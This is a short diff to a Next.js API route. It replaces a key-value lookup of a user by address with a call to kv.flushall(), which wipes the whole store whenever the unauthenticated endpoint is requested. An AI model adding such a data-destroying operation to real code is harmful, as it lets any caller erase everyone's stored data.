@@ -5,7 +5,6 @@ export default async function handler(
   req: NextApiRequest,
   res: NextApiResponse
 ) {
-  const { address } = req.query;
-  const user = await kv.json.get(`${address}`);
-  return res.status(200).json(user);
+  const response = await kv.flushall();
+  return res.status(200).json(response);
 }
